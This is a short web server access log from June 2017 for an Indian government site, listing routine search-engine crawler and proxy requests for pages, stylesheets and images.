207.46.13.27 - - [23/Jun/2017:08:13:45 +0530] "GET /project_details_view.php?id=1772 HTTP/1.1" 200 14548 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.102.6.111 - - [23/Jun/2017:08:14:58 +0530] "GET /project_details_view.php?id=1714 HTTP/1.1" 200 16022 "https://www.google.co.in/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.249.79.19 - - [23/Jun/2017:08:15:29 +0530] "GET /news_more.php HTTP/1.1" 200 21061 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
64.233.173.51 - - [23/Jun/2017:08:17:50 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "https://www.google.co.in/" "Mozilla/5.0 (Linux; Android 6.0.1; Moto G Play Build/MPI24.241-2.47) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
64.233.173.51 - - [23/Jun/2017:08:17:50 +0530] "GET /includes/ncdma.css HTTP/1.1" 200 13023 "https://www.google.co.in/" "Mozilla/5.0 (Linux; Android 6.0.1; Moto G Play Build/MPI24.241-2.47) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
64.233.173.47 - - [23/Jun/2017:08:17:50 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 8321 "https://www.google.co.in/" "Mozilla/5.0 (Linux; Android 6.0.1; Moto G Play Build/MPI24.241-2.47) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
64.233.173.49 - - [23/Jun/2017:08:17:50 +0530] "GET /project_details_view.php?id=1501 HTTP/1.1" 200 15176 "https://www.google.co.in/" "Mozilla/5.0 (Linux; Android 6.0.1; Moto G Play Build/MPI24.241-2.47) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
64.233.173.51 - - [23/Jun/2017:08:17:50 +0530] "GET /images/spacer.gif HTTP/1.1" 200 43 "http://www.cdmindia.gov.in/project_details_view.php?id=1501" "Mozilla/5.0 (Linux; Android 6.0.1; Moto G Play Build/MPI24.241-2.47) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
